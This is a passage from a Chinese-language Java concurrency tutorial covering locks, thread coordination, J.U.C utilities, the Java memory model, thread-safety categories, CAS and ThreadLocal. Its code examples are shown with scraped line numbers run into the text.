公平锁是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁；而非公平锁则不保证这一点，在锁被释放时，任何一个等待锁的线程都有机会获得锁。synchronized 中的锁是非公平的，ReentrantLock 默认情况下也是非公平的，但可以通过带布尔值的构造函数要求使用公平锁。 3. 锁绑定多个条件 一个 ReentrantLock 对象可以同时绑定多个 Condition 对象，而在 synchronized 中，锁对象的 wait() 和 notify() 或 notifyAll() 方法可以实现一个隐含的条件，如果要和多于一个的条件关联的时候，就不得不额外地添加一个锁，而 ReentrantLock 则无须这样做，只需要多次调用 newCondition() 方法即可。 synchronized 和 ReentrantLock 比较1. 锁的实现 synchronized 是 JVM 实现的，而 ReentrantLock 是 JDK 实现的。 2. 性能 从性能上来看，新版本 Java 对 synchronized 进行了很多优化，例如自旋锁等。目前来看它和 ReentrantLock 的性能基本持平了，因此性能因素不再是选择 ReentrantLock 的理由。synchronized 有更大的性能优化空间，应该优先考虑 synchronized。 3. 功能 ReentrantLock 多了一些高级功能。 4. 使用选择 除非需要使用 ReentrantLock 的高级功能，否则优先使用 synchronized。这是因为 synchronized 是 JVM 实现的一种锁机制，JVM 原生地支持它，而 ReentrantLock 不是所有的 JDK 版本都支持。并且使用 synchronized 不用担心没有释放锁而导致死锁问题，因为 JVM 会确保锁的释放。 六、线程之间的协作当多个线程可以一起工作去解决某个问题时，如果某些部分必须在其它部分之前完成，那么就需要对线程进行协调。 join()在线程中调用另一个线程的 join() 方法，会将当前线程挂起，而不是忙等待， 直到目标线程结束。 对于以下代码，虽然 b 线程先启动，但是因为在 b 线程中调用了 a 线程的 join() 方法，因此 b 线程会等待 a 线程结束才继续执行，因此最后能够保证 a 线程的输出先与 b 线程的输出。 1234567891011121314151617181920212223242526272829303132333435public class JoinExample &#123; private class A extends Thread &#123; @Override public void run() &#123; System.out.println("A"); &#125; &#125; private class B extends Thread &#123; private A a; B(A a) &#123; this.a = a; &#125; @Override public void run() &#123; try &#123; a.join(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("B"); &#125; &#125; public void test() &#123; A a = new A(); B b = new B(a); b.start(); a.start(); &#125;&#125; 1234public static void main(String[] args) &#123; JoinExample example = new JoinExample(); example.test();&#125; 12AB wait() notify() notifyAll()调用 wait() 使得线程等待某个条件满足，线程在等待时会被挂起，当其他线程的运行使得这个条件满足时，其它线程会调用 notify() 或者 notifyAll() 来唤醒挂起的线程。 它们都属于 Object 的一部分，而不属于 Thread。 只能用在同步方法或者同步控制块中使用，否则会在运行时抛出 IllegalMonitorStateExeception。 使用 wait() 挂起期间，线程会释放锁。这是因为，如果没有释放锁，那么其它线程就无法进入对象的同步方法或者同步控制块中，那么就无法执行 notify() 或者 notifyAll() 来唤醒挂起的线程，造成死锁。 123456789101112131415public class WaitNotifyExample &#123; public synchronized void before() &#123; System.out.println("before"); notifyAll(); &#125; public synchronized void after() &#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("after"); &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); WaitNotifyExample example = new WaitNotifyExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter wait() 和 sleep() 的区别 wait() 是 Object 的方法，而 sleep() 是 Thread 的静态方法； wait() 会释放锁，sleep() 不会。 await() signal() signalAll()java.util.concurrent 类库中提供了 Condition 类来实现线程之间的协调，可以在 Condition 上调用 await() 方法使线程等待，其它线程调用 signal() 或 signalAll() 方法唤醒等待的线程。相比于 wait() 这种等待方式，await() 可以指定等待的条件，因此更加灵活。 使用 Lock 来获取一个 Condition 对象。 1234567891011121314151617181920212223242526public class AwaitSignalExample &#123; private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); public void before() &#123; lock.lock(); try &#123; System.out.println("before"); condition.signalAll(); &#125; finally &#123; lock.unlock(); &#125; &#125; public void after() &#123; lock.lock(); try &#123; condition.await(); System.out.println("after"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; lock.unlock(); &#125; &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); AwaitSignalExample example = new AwaitSignalExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter 七、J.U.C - AQSjava.util.concurrent（J.U.C）大大提高了并发性能，AQS 被认为是 J.U.C 的核心。 CountdownLatch用来控制一个线程等待多个线程。 维护了一个计数器 cnt，每次调用 countDown() 方法会让计数器的值减 1，减到 0 的时候，那些因为调用 await() 方法而在等待的线程就会被唤醒。 1234567891011121314151617public class CountdownLatchExample &#123; public static void main(String[] args) throws InterruptedException &#123; final int totalThread = 10; CountDownLatch countDownLatch = new CountDownLatch(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print("run.."); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); System.out.println("end"); executorService.shutdown(); &#125;&#125; 1run..run..run..run..run..run..run..run..run..run..end CyclicBarrier用来控制多个线程互相等待，只有当多个线程都到达时，这些线程才会继续执行。 和 CountdownLatch 相似，都是通过维护计数器来实现的。但是它的计数器是递增的，每次执行 await() 方法之后，计数器会加 1，直到计数器的值和设置的值相等，等待的所有线程才会继续执行。和 CountdownLatch 的另一个区别是，CyclicBarrier 的计数器可以循环使用，所以它才叫做循环屏障。 下图应该从下往上看才正确。 123456789101112131415161718192021public class CyclicBarrierExample &#123; public static void main(String[] args) throws InterruptedException &#123; final int totalThread = 10; CyclicBarrier cyclicBarrier = new CyclicBarrier(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print("before.."); try &#123; cyclicBarrier.await(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (BrokenBarrierException e) &#123; e.printStackTrace(); &#125; System.out.print("after.."); &#125;); &#125; executorService.shutdown(); &#125;&#125; 1before..before..before..before..before..before..before..before..before..before..after..after..after..after..after..after..after..after..after..after.. SemaphoreSemaphore 就是操作系统中的信号量，可以控制对互斥资源的访问线程数。 以下代码模拟了对某个服务的并发请求，每次只能有 3 个客户端同时访问，请求总数为 10。 123456789101112131415161718192021public class SemaphoreExample &#123; public static void main(String[] args) &#123; final int clientCount = 3; final int totalRequestCount = 10; Semaphore semaphore = new Semaphore(clientCount); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalRequestCount; i++) &#123; executorService.execute(()-&gt;&#123; try &#123; semaphore.acquire(); System.out.print(semaphore.availablePermits() + " "); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; semaphore.release(); &#125; &#125;); &#125; executorService.shutdown(); &#125;&#125; 12 1 2 2 2 2 2 1 2 2 八、J.U.C - 其它组件FutureTask在介绍 Callable 时我们知道它可以有返回值，返回值通过 Future&lt;V&gt; 进行封装。FutureTask 实现了 RunnableFuture 接口，该接口继承自 Runnable 和 Future&lt;V&gt; 接口，这使得 FutureTask 既可以当做一个任务执行，也可以有返回值。 1public class FutureTask&lt;V&gt; implements RunnableFuture&lt;V&gt; 1public interface RunnableFuture&lt;V&gt; extends Runnable, Future&lt;V&gt; 当一个计算任务需要执行很长时间，那么就可以用 FutureTask 来封装这个任务，用一个线程去执行该任务，然后其它线程继续执行其它任务。当需要该任务的计算结果时，再通过 FutureTask 的 get() 方法获取。 1234567891011121314151617181920212223242526272829public class FutureTaskExample &#123; public static void main(String[] args) throws ExecutionException, InterruptedException &#123; FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;Integer&gt;(new Callable&lt;Integer&gt;() &#123; @Override public Integer call() throws Exception &#123; int result = 0; for (int i = 0; i &lt; 100; i++) &#123; Thread.sleep(10); result += i; &#125; return result; &#125; &#125;); Thread computeThread = new Thread(futureTask); computeThread.start(); Thread otherThread = new Thread(() -&gt; &#123; System.out.println("other task is running..."); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); otherThread.start(); System.out.println(futureTask.get()); &#125;&#125; 12other task is running...4950 BlockingQueuejava.util.concurrent.BlockingQueue 接口有以下阻塞队列的实现： FIFO 队列 ：LinkedBlockingQueue、ArrayListBlockingQueue（固定长度） 优先级队列 ：PriorityBlockingQueue 提供了阻塞的 take() 和 put() 方法：如果队列为空 take() 将阻塞，直到队列中有内容；如果队列为满 put() 将阻塞，指到队列有空闲位置。 使用 BlockingQueue 实现生产者消费者问题 1234567891011121314151617181920212223242526272829public class ProducerConsumer &#123; private static BlockingQueue&lt;String&gt; queue = new ArrayBlockingQueue&lt;&gt;(5); private static class Producer extends Thread &#123; @Override public void run() &#123; try &#123; queue.put("product"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print("produce.."); &#125; &#125; private static class Consumer extends Thread &#123; @Override public void run() &#123; try &#123; String product = queue.take(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print("consume.."); &#125; &#125;&#125; 1234567891011121314public static void main(String[] args) &#123; for (int i = 0; i &lt; 2; i++) &#123; Producer producer = new Producer(); producer.start(); &#125; for (int i = 0; i &lt; 5; i++) &#123; Consumer consumer = new Consumer(); consumer.start(); &#125; for (int i = 0; i &lt; 3; i++) &#123; Producer producer = new Producer(); producer.start(); &#125;&#125; 1produce..produce..consume..consume..produce..consume..produce..consume..produce..consume.. ForkJoin主要用于并行计算中，和 MapReduce 原理类似，都是把大的计算任务拆分成多个小任务并行计算。 123456789101112131415161718192021222324252627282930public class ForkJoinExample extends RecursiveTask&lt;Integer&gt; &#123; private final int threhold = 5; private int first; private int last; public ForkJoinExample(int first, int last) &#123; this.first = first; this.last = last; &#125; @Override protected Integer compute() &#123; int result = 0; if (last - first &lt;= threhold) &#123; // 任务足够小则直接计算 for (int i = first; i &lt;= last; i++) &#123; result += i; &#125; &#125; else &#123; // 拆分成小任务 int middle = first + (last - first) / 2; ForkJoinExample leftTask = new ForkJoinExample(first, middle); ForkJoinExample rightTask = new ForkJoinExample(middle + 1, last); leftTask.fork(); rightTask.fork(); result = leftTask.join() + rightTask.join(); &#125; return result; &#125;&#125; 123456public static void main(String[] args) throws ExecutionException, InterruptedException &#123; ForkJoinExample example = new ForkJoinExample(1, 10000); ForkJoinPool forkJoinPool = new ForkJoinPool(); Future result = forkJoinPool.submit(example); System.out.println(result.get());&#125; ForkJoin 使用 ForkJoinPool 来启动，它是一个特殊的线程池，线程数量取决于 CPU 核数。 1public class ForkJoinPool extends AbstractExecutorService ForkJoinPool 实现了工作窃取算法来提高 CPU 的利用率。每个线程都维护了一个双端队列，用来存储需要执行的任务。工作窃取算法允许空闲的线程从其它线程的双端队列中窃取一个任务来执行。窃取的任务必须是最晚的任务，避免和队列所属线程发生竞争。例如下图中，Thread2 从 Thread1 的队列中拿出最晚的 Task1 任务，Thread1 会拿出 Task2 来执行，这样就避免发生竞争。但是如果队列中只有一个任务时还是会发生竞争。 九、线程不安全示例如果多个线程对同一个共享数据进行访问而不采取同步操作的话，那么操作的结果是不一致的。 以下代码演示了 1000 个线程同时对 cnt 执行自增操作，操作结束之后它的值为 997 而不是 1000。 123456789101112public class ThreadUnsafeExample &#123; private int cnt = 0; public void add() &#123; cnt++; &#125; public int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; ThreadUnsafeExample example = new ThreadUnsafeExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 1997 十、Java 内存模型Java 内存模型试图屏蔽各种硬件和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果。 主内存与工作内存处理器上的寄存器的读写的速度比内存快几个数量级，为了解决这种速度矛盾，在它们之间加入了高速缓存。 加入高速缓存带来了一个新的问题：缓存一致性。如果多个缓存共享同一块主内存区域，那么多个缓存的数据可能会不一致，需要一些协议来解决这个问题。 所有的变量都存储在主内存中，每个线程还有自己的工作内存，工作内存存储在高速缓存或者寄存器中，保存了该线程使用的变量的主内存副本拷贝。 线程只能直接操作工作内存中的变量，不同线程之间的变量值传递需要通过主内存来完成。 内存间交互操作Java 内存模型定义了 8 个操作来完成主内存和工作内存的交互操作。 read：把一个变量的值从主内存传输到工作内存中 load：在 read 之后执行，把 read 得到的值放入工作内存的变量副本中 use：把工作内存中一个变量的值传递给执行引擎 assign：把一个从执行引擎接收到的值赋给工作内存的变量 store：把工作内存的一个变量的值传送到主内存中 write：在 store之后执行，把 store 得到的值放入主内存的变量中 lock：作用于主内存的变量 unlock 内存模型三大特性1. 原子性Java 内存模型保证了 read、load、use、assign、store、write、lock 和 unlock 操作具有原子性，例如对一个 int 类型的变量执行 assign 赋值操作，这个操作就是原子性的。但是 Java 内存模型允许虚拟机将没有被 volatile 修饰的 64 位数据（long，double）的读写操作划分为两次 32 位的操作来进行，即 load、store、read 和 write 操作可以不具备原子性。 有一个错误认识就是，int 等原子性的变量在多线程环境中不会出现线程安全问题。前面的线程不安全示例代码中，cnt 变量属于 int 类型变量，1000 个线程对它进行自增操作之后，得到的值为 997 而不是 1000。 为了方便讨论，将内存间的交互操作简化为 3 个：load、assign、store。 下图演示了两个线程同时对 cnt 变量进行操作，load、assign、store 这一系列操作整体上看不具备原子性，那么在 T1 修改 cnt 并且还没有将修改后的值写入主内存，T2 依然可以读入该变量的值。可以看出，这两个线程虽然执行了两次自增运算，但是主内存中 cnt 的值最后为 1 而不是 2。因此对 int 类型读写操作满足原子性只是说明 load、assign、store 这些单个操作具备原子性。 AtomicInteger 能保证多个线程修改的原子性。 使用 AtomicInteger 重写之前线程不安全的代码之后得到以下线程安全实现： 1234567891011public class AtomicExample &#123; private AtomicInteger cnt = new AtomicInteger(); public void add() &#123; cnt.incrementAndGet(); &#125; public int get() &#123; return cnt.get(); &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicExample example = new AtomicExample(); // 只修改这条语句 final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 除了使用原子类之外，也可以使用 synchronized 互斥锁来保证操作的完整性，它对应的内存间交互操作为：lock 和 unlock，在虚拟机实现上对应的字节码指令为 monitorenter 和 monitorexit。 1234567891011public class AtomicSynchronizedExample &#123; private int cnt = 0; public synchronized void add() &#123; cnt++; &#125; public synchronized int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicSynchronizedExample example = new AtomicSynchronizedExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 2. 可见性可见性指当一个线程修改了共享变量的值，其它线程能够立即得知这个修改。Java 内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值来实现可见性的。 volatile 可保证可见性。synchronized 也能够保证可见性，对一个变量执行 unlock 操作之前，必须把变量值同步回主内存。final 关键字也能保证可见性：被 final 关键字修饰的字段在构造器中一旦初始化完成，并且没有发生 this 逃逸（其它线程可以通过 this 引用访问到初始化了一半的对象），那么其它线程就能看见 final 字段的值。 对前面的线程不安全示例中的 cnt 变量用 volatile 修饰，不能解决线程不安全问题，因为 volatile 并不能保证操作的原子性。 3. 有序性有序性是指：在本线程内观察，所有操作都是有序的。在一个线程观察另一个线程，所有操作都是无序的，无序是因为发生了指令重排序。 在 Java 内存模型中，允许编译器和处理器对指令进行重排序，重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性。 volatile 关键字通过添加内存屏障的方式来禁止指令重排，即重排序时不能把后面的指令放到内存屏障之前。 也可以通过 synchronized 来保证有序性，它保证每个时刻只有一个线程执行同步代码，相当于是让线程顺序执行同步代码。 先行发生原则上面提到了可以用 volatile 和 synchronized 来保证有序性。除此之外，JVM 还规定了先行发生原则，让一个操作无需控制就能先于另一个操作完成。 主要有以下这些原则： 1. 单一线程原则 Single Thread rule 在一个线程内，在程序前面的操作先行发生于后面的操作。 2. 管程锁定规则 Monitor Lock Rule 一个 unlock 操作先行发生于后面对同一个锁的 lock操作。 3. volatile 变量规则 Volatile Variable Rule 对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作。 4. 线程启动规则 Thread Start Rule Thread 对象的 start() 方法调用先行发生于此线程的每一个动作。 5. 线程加入规则 Thread Join Rule join() 方法返回先行发生于 Thread 对象的结束。 6. 线程中断规则 Thread Interruption Rule 对线程 interrupt() 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 Thread.interrupted() 方法检测到是否有中断发生。 7. 对象终结规则 Finalizer Rule 一个对象的初始化完成（构造函数执行结束）先行发生于它的 finalize() 方法的开始。 8. 传递性 Transitivity 如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那么操作 A 先行发生于操作 C。 十一、线程安全线程安全定义一个类在可以被多个线程安全调用时就是线程安全的。 线程安全分类线程安全不是一个非真即假的命题，可以将共享数据按照安全程度的强弱顺序分成以下五类：不可变、绝对线程安全、相对线程安全、线程兼容和线程对立。 1. 不可变不可变（Immutable）的对象一定是线程安全的，无论是对象的方法实现还是方法的调用者，都不需要再采取任何的线程安全保障措施，只要一个不可变的对象被正确地构建出来，那其外部的可见状态永远也不会改变，永远也不会看到它在多个线程之中处于不一致的状态。 不可变的类型： final 关键字修饰的基本数据类型； String 枚举类型 Number 部分子类，如 Long 和 Double 等数值包装类型，BigInteger 和 BigDecimal 等大数据类型。但同为 Number 的子类型的原子类 AtomicInteger 和 AtomicLong 则并非不可变的。 对于集合类型，可以使用 Collections.unmodifiableXXX() 方法来获取一个不可变的集合。 1234567public class ImmutableExample &#123; public static void main(String[] args) &#123; Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); Map&lt;String, Integer&gt; unmodifiableMap = Collections.unmodifiableMap(map); unmodifiableMap.put("a", 1); &#125;&#125; 123Exception in thread "main" java.lang.UnsupportedOperationException at java.util.Collections$UnmodifiableMap.put(Collections.java:1457) at ImmutableExample.main(ImmutableExample.java:9) Collections.unmodifiableXXX() 先对原始的集合进行拷贝，需要对集合进行修改的方法都直接抛出异常。 123public V put(K key, V value) &#123; throw new UnsupportedOperationException();&#125; 多线程环境下，应当尽量使对象成为不可变，来满足线程安全。 2. 绝对线程安全不管运行时环境如何，调用者都不需要任何额外的同步措施。 3. 相对线程安全相对的线程安全需要保证对这个对象单独的操作是线程安全的，在调用的时候不需要做额外的保障措施，但是对于一些特定顺序的连续调用，就可能需要在调用端使用额外的同步手段来保证调用的正确性。 在 Java 语言中，大部分的线程安全类都属于这种类型，例如 Vector、HashTable、Collections 的 synchronizedCollection() 方法包装的集合等。 对于下面的代码，如果删除元素的线程删除了一个元素，而获取元素的线程试图访问一个已经被删除的元素，那么就会抛出 ArrayIndexOutOfBoundsException。 1234567891011121314151617181920212223public class VectorUnsafeExample &#123; private static Vector&lt;Integer&gt; vector = new Vector&lt;&gt;(); public static void main(String[] args) &#123; while (true) &#123; for (int i = 0; i &lt; 100; i++) &#123; vector.add(i); &#125; ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.remove(i); &#125; &#125;); executorService.execute(() -&gt; &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.get(i); &#125; &#125;); executorService.shutdown(); &#125; &#125;&#125; 12345Exception in thread "Thread-159738" java.lang.ArrayIndexOutOfBoundsException: Array index out of range: 3 at java.util.Vector.remove(Vector.java:831) at VectorUnsafeExample.lambda$main$0(VectorUnsafeExample.java:14) at VectorUnsafeExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) 如果要保证上面的代码能正确执行下去，就需要对删除元素和获取元素的代码进行同步。 1234567891011121314executorService.execute(() -&gt; &#123; synchronized (vector) &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.remove(i); &#125; &#125;&#125;);executorService.execute(() -&gt; &#123; synchronized (vector) &#123; for (int i = 0; i &lt; vector.size(); i++) &#123; vector.get(i); &#125; &#125;&#125;); 4. 线程兼容线程兼容是指对象本身并不是线程安全的，但是可以通过在调用端正确地使用同步手段来保证对象在并发环境中可以安全地使用，我们平常说一个类不是线程安全的，绝大多数时候指的是这一种情况。Java API 中大部分的类都是属于线程兼容的，如与前面的 Vector 和 HashTable 相对应的集合类 ArrayList 和 HashMap 等。 5. 线程对立线程对立是指无论调用端是否采取了同步措施，都无法在多线程环境中并发使用的代码。由于 Java 语言天生就具备多线程特性，线程对立这种排斥多线程的代码是很少出现的，而且通常都是有害的，应当尽量避免。 线程安全的实现方法1. 互斥同步synchronized 和 ReentrantLock。 2. 非阻塞同步互斥同步最主要的问题就是进行线程阻塞和唤醒所带来的性能问题，因此这种同步也称为阻塞同步（Blocking Synchronization）。 从处理问题的方式上说，互斥同步属于一种悲观的并发策略，总是认为只要不去做正确的同步措施（例如加锁），那就肯定会出现问题，无论共享数据是否真的会出现竞争，它都要进行加锁（这里讨论的是概念模型，实际上虚拟机会优化掉很大一部分不必要的加锁）、用户态核心态转换、维护锁计数器和检查是否有被阻塞的线程需要唤醒等操作。随着硬件指令集的发展，我们有了另外一个选择：基于冲突检测的乐观并发策略，通俗地说，就是先进行操作，如果没有其他线程争用共享数据，那操作就成功了；如果共享数据有争用，产生了冲突，那就再采取其他的补偿措施（最常见的补偿措施就是不断地重试，直到成功为止），这种乐观的并发策略的许多实现都不需要把线程挂起，因此这种同步操作称为非阻塞同步（Non-Blocking Synchronization）。 乐观锁需要操作和冲突检测这两个步骤具备原子性，这里就不能再使用互斥同步来保证了，只能靠硬件来完成。硬件支持的原子性操作最典型的是：比较并交换（Compare-and-Swap，CAS）。 CAS 指令需要有 3 个操作数，分别是内存位置（在 Java 中可以简单理解为变量的内存地址，用 V 表示）、旧的预期值（用 A 表示）和新值（用 B 表示）。CAS 指令执行时，当且仅当 V 符合旧预期值 A 时，处理器用新值 B 更新 V 的值，否则它就不执行更新。但是无论是否更新了 V 的值，都会返回 V 的旧值，上述的处理过程是一个原子操作。 J.U.C 包里面的整数原子类 AtomicInteger，其中的 compareAndSet() 和 getAndIncrement() 等方法都使用了 Unsafe 类的 CAS 操作。 在下面的代码 1 中，使用了 AtomicInteger 执行了自增的操作。代码 2 是 incrementAndGet() 的源码，它调用了 unsafe 的 getAndAddInt() 。代码 3 是 getAndAddInt() 源码，var1 指示内存位置，var2 指示新值，var4 指示操作需要加的数值，这里为 1。在代码 3 的实现中，通过 getIntVolatile(var1, var2) 得到旧的预期值。通过调用 compareAndSwapInt() 来进行 CAS 比较，如果 var2=var5，那么就更新内存地址为 var1 的变量为 var5+var4。可以看到代码 3 是在一个循环中进行，发生冲突的做法是不断的进行重试。 123456// 代码 1private AtomicInteger cnt = new AtomicInteger();public void add() &#123; cnt.incrementAndGet();&#125; 1234// 代码 2public final int incrementAndGet() &#123; return unsafe.getAndAddInt(this, valueOffset, 1) + 1;&#125; 123456789// 代码 3public final int getAndAddInt(Object var1, long var2, int var4) &#123; int var5; do &#123; var5 = this.getIntVolatile(var1, var2); &#125; while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4)); return var5;&#125; ABA ：如果一个变量初次读取的时候是 A 值，它的值被改成了 B，后来又被改回为 A，那 CAS 操作就会误认为它从来没有被改变过。J.U.C 包提供了一个带有标记的原子引用类“AtomicStampedReference”来解决这个问题，它可以通过控制变量值的版本来保证 CAS 的正确性。大部分情况下 ABA 问题不会影响程序并发的正确性，如果需要解决 ABA 问题，改用传统的互斥同步可能会比原子类更高效。 3. 无同步方案要保证线程安全，并不是一定就要进行同步，两者没有因果关系。同步只是保证共享数据争用时的正确性的手段，如果一个方法本来就不涉及共享数据，那它自然就无须任何同步措施去保证正确性，因此会有一些代码天生就是线程安全的。 （一）可重入代码（Reentrant Code） 这种代码也叫做纯代码（Pure Code），可以在代码执行的任何时刻中断它，转而去执行另外一段代码（包括递归调用它本身），而在控制权返回后，原来的程序不会出现任何错误。相对线程安全来说，可重入性是更基本的特性，它可以保证线程安全，即所有的可重入的代码都是线程安全的，但是并非所有的线程安全的代码都是可重入的。 可重入代码有一些共同的特征，例如不依赖存储在堆上的数据和公用的系统资源、用到的状态量都由参数中传入、不调用非可重入的方法等。我们可以通过一个简单的原则来判断代码是否具备可重入性：如果一个方法，它的返回结果是可以预测的，只要输入了相同的数据，就都能返回相同的结果，那它就满足可重入性的要求，当然也就是线程安全的。 （二）栈封闭 多个线程访问同一个方法的局部变量时，不会出现线程安全问题，因为局部变量存储在栈中，属于线程私有的。 123456789101112import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class StackClosedExample &#123; public void add100() &#123; int cnt = 0; for (int i = 0; i &lt; 100; i++) &#123; cnt++; &#125; System.out.println(cnt); &#125;&#125; 1234567public static void main(String[] args) &#123; StackClosedExample example = new StackClosedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; example.add100()); executorService.execute(() -&gt; example.add100()); executorService.shutdown();&#125; 12100100 （三）线程本地存储（Thread Local Storage） 如果一段代码中所需要的数据必须与其他代码共享，那就看看这些共享数据的代码是否能保证在同一个线程中执行。如果能保证，我们就可以把共享数据的可见范围限制在同一个线程之内，这样，无须同步也能保证线程之间不出现数据争用的问题。 符合这种特点的应用并不少见，大部分使用消费队列的架构模式（如“生产者-消费者”模式）都会将产品的消费过程尽量在一个线程中消费完，其中最重要的一个应用实例就是经典 Web 交互模型中的“一个请求对应一个服务器线程”（Thread-per-Request）的处理方式，这种处理方式的广泛应用使得很多 Web 服务端应用都可以使用线程本地存储来解决线程安全问题。 可以使用 java.lang.ThreadLocal 类来实现线程本地存储功能。 对于以下代码，thread1 中设置 threadLocal 为 1，而 thread2 设置 threadLocal 为 2。过了一段时间之后，thread1 读取 threadLocal 依然是 1，不受 thread2 的影响。 123456789101112131415161718192021public class ThreadLocalExample &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal.set(1); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(threadLocal.get()); threadLocal.remove(); &#125;); Thread thread2 = new Thread(() -&gt; &#123; threadLocal.set(2); threadLocal.remove(); &#125;); thread1.start(); thread2.start(); &#125;&#125; 11 为了理解 ThreadLocal，先看以下代码： 12345678910111213141516public class ThreadLocalExample1 &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal1 = new ThreadLocal(); ThreadLocal threadLocal2 = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal1.set(1); threadLocal2.set(1); &#125;); Thread thread2 = new Thread(() -&gt; &#123; threadLocal1.set(2); threadLocal2.set(2); &#125;); thread1.start(); thread2.start(); &#125;&#125; 它所对应的底层结构图为： 每个 Thread 都有一个 ThreadLocal.ThreadLocalMap 对象，Thread 类中就定义了 ThreadLocal.ThreadLocalMap 成员。 123/* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. */ThreadLocal.ThreadLocalMap threadLocals = null; 当调用一个 ThreadLocal 的 set(T value) 方法时，先得到当前线程的 ThreadLocalMap 对象，然后将 ThreadLocal-&gt;value 键值对插入到该 Map 中。 12345678public void set(T value) &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value);&#125; get() 方法类似。 12345678910111213public T get() &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) &#123; ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) &#123; @SuppressWarnings("unchecked") T result = (T)e.value; return result; &#125; &#125; return setInitialValue();&#125; ThreadLocal 从理论上讲并不是用来解决多线程并发问题的，因为根本不存在多线程竞争。在一些场景 (尤其是使用线程池) 下，由于 ThreadLocal.ThreadLocalMap 的底层数据结构导致 ThreadLocal 有内存泄漏的情况，尽可能在每次使用 ThreadLocal 后手动调用 remove()，以避免出现 ThreadLocal 经典的内存泄漏甚至是造成自身业务混乱的风险。 十二、锁优化这里的锁优化主要是指虚拟机对 synchronized 的优化。 自旋锁互斥同步的进入阻塞状态的开销都很大，应该尽量避免。在许多应用中，共享数据的锁定状态只会持续很短的一段时间。自旋锁的思想是让一个线程在请求一个共享数据的锁时执行忙循环（自旋）一段时间，如果在这段时间内能获得锁，就可以避免进入阻塞状态。 自选锁虽然能避免进入阻塞状态从而减少开销，但是它需要进行忙循环操作占用 CPU 时间，它只适用于共享数据的锁定状态很短的场景。自旋次数的默认值是 10 次，用户可以使用虚拟机参数 -XX:PreBlockSpin 来更改。 在 JDK 1.6 中引入了自适应的自旋锁。自适应意味着自旋的次数不再固定了，而是由前一次在同一个锁上的自旋次数及锁的拥有者的状态来决定。 锁消除锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。 